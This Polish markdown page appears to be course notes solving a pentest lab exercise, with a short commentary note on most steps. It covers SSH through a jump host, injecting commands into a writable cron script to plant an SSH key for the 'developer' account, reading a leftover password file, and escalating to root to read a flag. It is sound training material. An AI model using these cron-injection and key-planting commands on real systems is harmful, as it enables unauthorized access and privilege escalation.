---
title: cw01_p.md
description: Zadania PENTEST
order: 2
---

## 1.1p - Dostęp przez maszynę pośrednią

```bash
ssh student@192.168.100.101 #pjatk
ssh pentest@192.168.200.151
```

## 1.2p - Zadanie cron i klucz SSH

> **Uwaga do rozwiązania:** W oryginale autor zaznacza niepewność tego kroku. Najpierw sprawdź właściciela, uprawnienia i ścieżkę zadania cron. Repozytorium używa `/opt/clean.sh`, slajdy `/home/developer/clean.sh`. Zmiana zadziała dopiero po uruchomieniu zadania cron jako `developer`; nie jest to natychmiastowe wykonanie.

```bash
cat /etc/crontab
ls -l /opt/clean.sh
echo "mkdir -p /home/developer/.ssh" >> /opt/clean.sh
echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh
```

## 1.3p - Logowanie jako developer

> **Uwaga do rozwiązania:** Przed wyjściem sprawdź, czy cron dopisał klucz do pliku developera. `exit` powinno wrócić na maszynę pośrednią, z której wykonujesz kolejne SSH.

```bash
#If 1.2 worked on 3rd command, before exit type 'echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh' too
exit
ssh developer@192.168.200.151
```

## 1.4p - Hasło w pozostawionym pliku

> **Uwaga do rozwiązania:** Repozytorium wskazuje `.password.txt.swp`, natomiast PDF 1p na s. 15 wskazuje `.bash_history`. To dwa warianty wycieku; odczytaj plik obecny w Twoim środowisku.

```bash
cat .password.txt.swp
# Odczytaj odpowiedź z wyświetlonego pliku.
su
#Type [ANSWER] as password
```

## 1.5p - Flaga roota

```bash
cat /root/root.txt
# Odczytaj odpowiedź z wyświetlonego pliku.
#Copy flag to website
```
